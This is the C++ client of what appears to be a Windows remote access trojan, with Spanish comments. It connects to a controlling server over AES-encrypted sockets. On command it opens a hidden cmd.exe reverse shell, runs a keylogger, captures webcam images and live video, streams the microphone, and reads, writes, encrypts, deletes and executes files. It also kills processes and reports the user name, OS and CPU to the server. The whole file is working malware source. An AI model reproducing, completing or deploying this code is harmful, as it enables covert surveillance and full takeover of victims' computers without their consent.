#include "cliente.hpp"
#include "mod_mic.hpp"
#include "mod_file_manager.hpp"
#include "mod_keylogger.hpp"
#include "mod_camara.hpp"
#include "misc.hpp"


void Cliente::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }

}

Cliente::Cliente() {
    this->Init_Key();
}

Cliente::~Cliente() {
	this->CerrarConexion();
    if (this->reverseSHELL != nullptr) {
        this->reverseSHELL->TerminarShell();
        delete this->reverseSHELL;
        this->reverseSHELL = nullptr;
    }
    if (this->mod_Mic != nullptr){
        delete this->mod_Mic;
        this->mod_Mic = nullptr;
    }
}

void Cliente::CerrarConexion() {
    if (this->sckSocket != INVALID_SOCKET) {
		closesocket(this->sckSocket);
		this->sckSocket = INVALID_SOCKET;
	}
}

bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
	struct addrinfo sAddress, *sP, *sServer;
	memset(&sAddress, 0, sizeof(sAddress));

	sAddress.ai_family = AF_UNSPEC;
	sAddress.ai_socktype = SOCK_STREAM;

	int iRes = getaddrinfo(cIP, cPuerto, &sAddress, &sServer);
	if (iRes != 0) {
        DebugPrint("[X] getaddrinfo error");
		return false;
	}

	for (sP = sServer; sP != nullptr; sP = sP->ai_next) {
		if ((this->sckSocket = socket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
			//socket error
			continue;
		}

		if (connect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
			//No se pudo conectar
            DebugPrint("[X] No se pudo conectar");
			continue;
		}
		//exito
		break;
	}

	if (sP == nullptr || this->sckSocket == INVALID_SOCKET) {
        freeaddrinfo(sServer);
        return false;
	}

    unsigned long int iBlock = 1;
    if (ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0) {
        DebugPrint("[X] No se pudo hacer block");
    }

    freeaddrinfo(sServer);
    
	return true;
}

void Cliente::MainLoop() {

    //Esperar por comandos
    char cBuffer[1024 * 100]; //100 kb (transferencia de archivos)
    memset(&cBuffer, 0, sizeof(cBuffer));
    while (true) {
        std::unique_lock<std::mutex> lock(this->mtx_running);
        if (!this->isRunning) {
            break;
        }
        lock.unlock();

        //Limpiar el buffer
        if (cBuffer[0] != 0) {
            memset(&cBuffer, 0, sizeof(cBuffer));
        }

        int iRecibido = this->cRecv(this->sckSocket, cBuffer, sizeof(cBuffer), false);

        if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
            //No se pudo recibir nada
            break;
        }

        if (iRecibido > 0) {
            this->ProcesarComando(cBuffer, iRecibido);
        }

    }

    if (this->mod_Mic != nullptr) {
        this->mod_Mic->m_DetenerLive();
        delete this->mod_Mic;
        this->mod_Mic = nullptr;
    }

    if (this->reverseSHELL != nullptr) {
        this->reverseSHELL->TerminarShell();
        delete this->reverseSHELL;
        this->reverseSHELL = nullptr;
    }

    if (this->mod_Key != nullptr) {
        this->mod_Key->Stop();
        delete this->mod_Key;
        this->mod_Key = nullptr;
    }

    if (this->mod_Cam != nullptr) {
        delete this->mod_Cam;
        this->mod_Cam = nullptr;
    }
}

void Cliente::ProcesarComando(char* pBuffer, int iSize) {

    std::vector<std::string> strIn = strSplit(std::string(pBuffer), CMD_DEL, 1);
    if (strIn.size() == 0) {
        //No hay comandos
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Recibir){
        // CMD + 1, resto son bytes
        int iHeaderSize = std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir).size() + 1;
        char *cBytes = pBuffer + iHeaderSize;
        if(this->fpArchivo != nullptr){
            int iEscrito = fwrite(cBytes, sizeof(char), iSize - iHeaderSize, this->fpArchivo);
            DebugPrint("[!] Escritos " + std::to_string(iEscrito));
        }
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_End){
        if(this->fpArchivo != nullptr){
            fclose(this->fpArchivo);
        }
        DebugPrint("[!] Descarga completa");
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Init){
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
        if(strIn.size() == 3){
            DebugPrint("[!] Descargando archivo en ruta " + strIn[1] + " | size: " + strIn[2]);
            if((this->fpArchivo = fopen(strIn[1].c_str(), "wb")) == nullptr){
                DebugPrint("[X] No se pudo abrir el archivo " + strIn[1]);
            }
        } else {
            DebugPrint("[X] Error parseando comando: " + std::string(pBuffer));
        }
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::PING) {
        DebugPrint("[!]PING");
        std::string strComand = std::to_string(EnumComandos::PONG);
        strComand.append(1, CMD_DEL);
        this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
        return;
    }

    
    //#####################################################
    //#####################################################
    //#        COMANDOS SUBMENU ADMIN ARCHIVOS           #
    
    //Listar drives
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Discos) {
        std::vector<struct sDrives> vDrives = Drives();
        std::string strDipositivos = std::to_string(EnumComandos::FM_Discos_Lista);
        strDipositivos.append(1, CMD_DEL);
        for (auto dev : vDrives) {
            std::string sLetter = dev.cLetter;
            std::string sFree = std::to_string(dev.dFree);
            std::string sTotal = std::to_string(dev.dTotal);
            std::string strTemp = sLetter.substr(0, sLetter.length() - 2);
            strTemp.append(1, '|');
            strTemp += dev.cType;
            strTemp.append(1, '|');
            strTemp += dev.cLabel;
            strTemp.append(1, '|');
            strTemp += sFree.substr(0, sFree.length() - 4);
            strTemp.append(1, '|');
            strTemp += sTotal.substr(0, sTotal.length() - 4);
            strTemp.append(1, CMD_DEL);

            strDipositivos += strTemp;
        }
        strDipositivos = strDipositivos.substr(0, strDipositivos.length() - 1);

        this->cSend(this->sckSocket, strDipositivos.c_str(), strDipositivos.size() + 1, 0, false);
        return;
    }

    //Lista directorio
    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Dir_Folder){
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        std::string strPath = "";
        if (strIn[1] == "DESCAR-DOWN") {
            strPath = this->ObtenerDown();
            std::string strPathBCDown = std::to_string(EnumComandos::FM_CPATH);
            strPathBCDown.append(1, CMD_DEL);
            strPathBCDown += strPath;
            this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true);
            Sleep(10);
        } else if (strIn[1] == "ESCRI-DESK") {
            strPath = this->ObtenerDesk();
            std::string strPathBCDesk = std::to_string(EnumComandos::FM_CPATH);
            strPathBCDesk.append(1, CMD_DEL);
            strPathBCDesk += strPath;
            this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true);
            Sleep(10);
        } else {
            strPath = strIn[1];
        }
        for (auto item : vDir(strPath.c_str())) {
            std::string strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
            strCommand.append(1, CMD_DEL);
            strCommand.append(item);
            this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
            Sleep(20);
        }
        return;
    }

    //crear folder
    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Folder) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        CrearFolder(strIn[1].c_str());
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Archivo) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        CrearArchivo(strIn[1].c_str());
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Borrar_Archivo) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        BorrarArchivo(strIn[1].c_str());
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
        std::string param1 = strIn[1];
        std::string param2 = strIn[2];
        std::thread th(&EnviarArchivo, param1, param2);
        th.detach();
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Ejecutar_Archivo){
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
        bool isOK = Execute(strIn[1].c_str(), strIn[2] == "1" ? 1 : 0);

        if(isOK){
            DebugPrint("[!] " + strIn[1] + " - ejecutado");
        } else {
            DebugPrint("[X] Error ejecutando " + strIn[1]);
        }
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Editar_Archivo){
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
        EditarArchivo(strIn[1], strIn[2]);
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Editar_Archivo_Guardar) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        int iHeader = strIn[0].size() + strIn[1].size() + 2;
        char* cBytes = pBuffer + iHeader;
        std::string strBuffer = std::string(cBytes);

        EditarArchivo_Guardar(strIn[1], strBuffer.c_str(), static_cast<std::streamsize>(iSize) - iHeader);
        return;
    }

    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crypt_Archivo) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
        Crypt_Archivo(strIn[2], strIn[1][0], strIn[1][1], strIn[3]);
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //#        COMANDOS SUBMENU ADMIN PROCESOS            #

    if (this->Comandos[strIn[0].c_str()] == EnumComandos::PM_Refrescar) {
        std::string strProc = std::to_string(EnumComandos::PM_Lista);
        strProc.append(1, CMD_DEL);
        strProc += strProcessList();
        this->cSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, false);
        return;
    }
    
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::PM_Kill) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        if (!EndProcess(atoi(strIn[1].c_str()))) {
            DebugPrint("[X] No se pudo terminar el PID " + strIn[1]);
        }

        return;
    }

    //#####################################################

    //#####################################################
    //#####################################################
    //#                   KEYLOGGER                       #
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::KL_Iniciar) {
        if (this->mod_Key == nullptr) {
            this->mod_Key = new mod_Keylogger();
            this->mod_Key->Start();
        }
        return;
    }

    if (this->Comandos[strIn[0].c_str()] == EnumComandos::KL_Detener) {
        if (this->mod_Key) {
            this->mod_Key->Stop();
            delete this->mod_Key;
            this->mod_Key = nullptr;
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //#                   CAMARA                          #
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Lista) {
        //Enviar lista de camaras
        if (!this->mod_Cam) {
            this->mod_Cam = new mod_Camera();
        }

        std::string strPaquete = std::to_string(EnumComandos::CM_Lista_Salida);
        strPaquete.append(1, CMD_DEL);

        std::vector<std::string> cDev = this->mod_Cam->ListNameCaptureDevices();
        if (cDev.size() > 0) {
            for (std::string cDevice : cDev) {
                DebugPrint(cDevice);
                strPaquete += cDevice;
                strPaquete.append(1, '|');
            }
            strPaquete = strPaquete.substr(0, strPaquete.size() - 1);
        } else {
            strPaquete += "Nica|Nica2 :v";
        }
        DebugPrint(strPaquete);
        this->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true);

        return;
    }

    if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Single) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        if (!this->mod_Cam) {
            this->mod_Cam = new mod_Camera();
            this->mod_Cam->ListNameCaptureDevices();
            if (this->mod_Cam->vcCamObjs.size() <= 0) {
                DebugPrint("[X] No se obtuvieron camaras");
                delete this->mod_Cam;
                this->mod_Cam = nullptr;
                return;
            }
        }

        HRESULT hr = S_OK;
        u_int iDeviceIndex = atoi(strIn[1].c_str());
        
        if (iDeviceIndex > this->mod_Cam->vcCamObjs.size()) {
            iDeviceIndex = 0; //Si el numero enviado desde el sever es mayor setear a 0 como default
        }

        if (this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
            return;
        }

        hr = this->mod_Cam->Init(this->mod_Cam->vcCamObjs[iDeviceIndex].sActivate, iDeviceIndex);
        
        if (SUCCEEDED(hr)) {
            this->mod_Cam->vcCamObjs[iDeviceIndex].isActivated = true;

            DebugPrint("[!] Camara iniciada correctamente");

            std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
            strHeader.append(1, CMD_DEL);
            strHeader += strIn[1];
            strHeader.append(1, CMD_DEL);

            //Testing
            int iBufferSize = 0;
            int iHeaderSize = strHeader.size();
            u_int iJPGBufferSize = 0;
            u_int uiPacketSize = 0;
            BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize, iDeviceIndex);
            BYTE* cJPGBuffer = nullptr;
            BYTE* cPacket = nullptr;

            if (cBuffer) {
                cJPGBuffer = this->mod_Cam->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
                if (cJPGBuffer) {
                    uiPacketSize = iHeaderSize + iJPGBufferSize;
                    cPacket = new BYTE[uiPacketSize];
                    if (cPacket) {
                        memcpy(cPacket, strHeader.c_str(), iHeaderSize);
                        memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);

                        int iSent = this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
                        DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");

                        delete[] cPacket;
                        cPacket = nullptr;
                    }
                    delete[] cJPGBuffer;
                    cJPGBuffer = nullptr;
                }
            }

            if (cBuffer) {
                delete[] cBuffer;
                cBuffer = nullptr;
            }
        }

        this->mod_Cam->vcCamObjs[iDeviceIndex].ReleaseCam();

        return;
    }

    if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Start) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        u_int iDeviceIndex = atoi(strIn[1].c_str());
        if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
            this->mod_Cam->SpawnLive(iDeviceIndex);
        }
    }

    if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Stop) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        u_int iDeviceIndex = atoi(strIn[1].c_str());
        this->mod_Cam->JoinLiveThread(iDeviceIndex);
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //                    MIC                             # 
    //Lista de dispositivos de entrada (mic)
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Refre_Dispositivos) {
        if (this->mod_Mic == nullptr) {
            this->mod_Mic = new Mod_Mic(this);
        }
        
        this->mod_Mic->sckSocket = this->sckSocket;
        this->mod_Mic->m_Enviar_Dispositivos();
        return;
    }

    //Escuchar mic en tiempo real
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Iniciar_Escucha) {
        strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
        if (this->mod_Mic == nullptr) {
            this->mod_Mic = new Mod_Mic(this);
        }
        this->mod_Mic->sckSocket = this->sckSocket;
        this->mod_Mic->p_DeviceID = atoi(strIn[1].c_str());
        this->mod_Mic->m_EmpezarLive();
        return;
    }

    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Detener_Escucha) {
        if (this->mod_Mic != nullptr) {
            this->mod_Mic->sckSocket = this->sckSocket;
            this->mod_Mic->m_DetenerLive();
            Sleep(100);
            delete this->mod_Mic;
            this->mod_Mic = nullptr;
        }
        return;
    }
    //#####################################################

    //#####################################################
    //#####################################################
    //                REVERSE SHELL                       # 
    //Iniciar shell
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Reverse_Shell_Start) {
        if (this->reverseSHELL != nullptr) {
            this->reverseSHELL->TerminarShell();
            delete this->reverseSHELL;
            this->reverseSHELL = nullptr;
        }
        this->reverseSHELL = new ReverseShell(this);
        this->reverseSHELL->sckSocket = this->sckSocket;
        this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");     
        return;   
    }

    //Escribir comando a la shell
    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Reverse_Shell_Command) {
        char* cData = pBuffer + strIn[0].size() + 1;
        if (this->reverseSHELL) {
            std::string strJoined = std::string(cData);
            this->reverseSHELL->thEscribirShell(strJoined);

            if (strJoined == "exit\r\n") {
                if (this->reverseSHELL) {
                    this->reverseSHELL->TerminarShell();
                    delete this->reverseSHELL;
                    this->reverseSHELL = nullptr;
                }
                DebugPrint("[!] Shell terminada");
            }
        }
        return;
    }

}


void Cliente::iniPacket() {
    //Enviar SO
    std::string strOut = "01";
    strOut.append(1, CMD_DEL);
    strOut += strOS();
    strOut.append(1, CMD_DEL);
    strOut += strUserName();
    strOut.append(1, CMD_DEL);
    strOut += std::to_string(GetCurrentProcessId());
    strOut.append(1, CMD_DEL);
    strOut += strCpu();
    
    int iB = cSend(this->sckSocket, strOut.c_str(), strOut.length(), 0, false);
    
    DebugPrint("[INIT]Enviados " + std::to_string(iB) + " bytes");
}

int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
    
    // 1 non block
    // 0 block
    std::unique_lock<std::mutex> lock(this->sck_mutex);

    ByteArray cData = this->bEnc((const unsigned char*)pBuffer, pLen);
    int iDataSize = cData.size();
    char* newBuffer = new char[iDataSize];
    for (int iBytePos = 0; iBytePos < iDataSize; iBytePos++) {
        std::memcpy(newBuffer + iBytePos, &cData[iBytePos], 1);
    }
    int iEnviado = 0;
    if (isBlock) {

        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DebugPrint("No se pudo hacer block");
        }
        
        iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
        
        //Restaurar
        if (!this->BLOCK_MODE) {
            iBlock = 1;
            if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
                DebugPrint("No se pudo restaurar el block_mode del socket");
            }
        }
    } else {
        iEnviado = send(pSocket, newBuffer, iDataSize, pFlags);
    }

    if (newBuffer != nullptr) {
        delete[] newBuffer;
    }


    return iEnviado;
}

int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock) {
    //Aqui el socket por defecto es block asi que si se pasa false es normal
    // 1 non block
    // 0 block
    std::unique_lock<std::mutex> lock(this->sck_mutex);

    char* cTmpBuff = new char[pLen];
    ZeroMemory(cTmpBuff, pLen);

    int iRecibido = 0;
    if (isBlock) {
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DebugPrint("No se pudo hacer block");
        }
        
        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        
        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }
        //Decrypt

        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        iRecibido = bOut.size();
        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
        }

        //Restaurar
        if (!this->BLOCK_MODE) {
            iBlock = 1;
            if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
                DebugPrint("No se pudo restaurar el block_mode en el socket");
            }
        }
        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }else {
        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        
        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }
        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        iRecibido = bOut.size();
        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
        }

        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }
}

//Misc
std::string Cliente::ObtenerDesk() {
    TCHAR szTemp[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, szTemp) == S_OK) {
        return std::string(szTemp) + "\\";
    }
    return std::string("-");
}

std::string Cliente::ObtenerDown() {
    TCHAR szTemp[MAX_PATH];
    std::string strRutaDesc = "";
    WIN32_FIND_DATA win32Archivo_1;
    if (GetEnvironmentVariable("USERPROFILE", (LPSTR)szTemp, sizeof(szTemp)) > 0) {
        strRutaDesc = szTemp;
        strRutaDesc += "\\Descargas";
        if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
            return strRutaDesc + "\\";
        }
        else {
            strRutaDesc = szTemp;
            strRutaDesc += "\\Downloads";
            if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
                return strRutaDesc + "\\";
            }
            else {
                return std::string("-");
            };
        }
    }
    else {
        return std::string("-");
    }
}

//AES256
ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
    this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        DebugPrint("Error encriptando " + std::string((const char*)pInput));
    }
    return bOutput;
}

ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
    this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        DebugPrint("Error desencriptando " + std::string((const char*)pInput));
    }
    return bOutput;
}

//Reverse shell

bool ReverseShell::SpawnShell(const char* pstrComando) {
    DebugPrint("Lanzando " + std::string(pstrComando));

    this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = nullptr;
    sa.bInheritHandle = true;
    if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
        DebugPrint("Error creando tuberias");
        return false;
    }
    STARTUPINFO si;
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = this->stdoutWr;
    si.hStdError = this->stdoutWr;
    si.hStdInput = this->stdinRd;

    if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
        DebugPrint("No se pudo spawnear la shell");
        return false;
    }
    
    //La shell esta corriendo
    this->isRunning = true;
    DebugPrint("Running!");
    if (this->copy_ptr != nullptr) {
        std::string strRun = "04" + CMD_DEL;
        strRun += "RU";
        this->copy_ptr->cSend(this->sckSocket, strRun.c_str(), strRun.size(), 0, false);
    }
    
    this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
    
    return true;
}

void ReverseShell::TerminarShell() {
    
    std::unique_lock<std::mutex> lock(this->mutex_shell);
    this->isRunning = false;
    lock.unlock();

    if (this->tRead.joinable()) {
        this->tRead.join();
    }

    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Finish);
    strComando += CMD_DEL;
    strComando += "Done...";
    this->copy_ptr->cSend(this->sckSocket, strComando.c_str(), strComando.size()+1, 0, false);

    TerminateProcess(this->pi.hProcess, 0);
    if (this->stdinRd != nullptr) {
        CloseHandle(this->stdinRd);
        this->stdinRd = nullptr;
    }
    if (this->stdinWr != nullptr) {
        CloseHandle(this->stdinWr);
        this->stdinWr = nullptr;
    }
    if (this->stdoutRd != nullptr) {
        CloseHandle(this->stdoutRd);
        this->stdoutRd = nullptr;
    }
    if (this->stdoutWr != nullptr) {
        CloseHandle(this->stdoutWr);
        this->stdoutWr = nullptr;
    }
}

void ReverseShell::thLeerShell(HANDLE hPipe) {
    //int iLen = 0; , iRet = 0;
    char cBuffer[4096], cBuffer2[4096 * 2 + 30];
    DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
    BYTE bPChar = 0;
    while (this->isRunning) {
        if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
            if (dBytesReaded > 0) {
                ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
            }else {
                Sleep(100);
                continue;
            }
            for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
                if (cBuffer[dBufferC] == '\n' && bPChar != '\r') {
                    cBuffer2[dBytesToWrite++] = '\r';
                }
                bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
            }
            cBuffer2[dBytesToWrite] = '\0';

            std::string strOut = std::to_string(EnumComandos::Reverse_Shell_Salida);
            strOut.append(1, CMD_DEL);
            strOut += cBuffer2;
        
            int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
            Sleep(10);
            if (iEnviado <= 0) {
                //Desconectado o se perdio la conexion
                std::unique_lock<std::mutex> lock(this->mutex_shell);
                this->isRunning = false;
                lock.unlock();
                break;
            }

        }else {
            //error peeknamedpipe
            std::unique_lock<std::mutex> lock(this->mutex_shell);
            this->isRunning = false;
            lock.unlock();
            break;
        }
    }
    DebugPrint("[!]thLeerShell finalizada");
}

void ReverseShell::thEscribirShell(std::string pStrInput) {
    if (pStrInput == "exit\r\n") {
        std::unique_lock<std::mutex> lock(this->mutex_shell);
        this->isRunning = false;
        lock.unlock();
    }

    DWORD dBytesWrited = 0;
    //stdinWr tuberia de entrada
    if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
        DebugPrint("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
        std::unique_lock<std::mutex> lock(this->mutex_shell);
        this->isRunning = false;
        lock.unlock();
    }
}
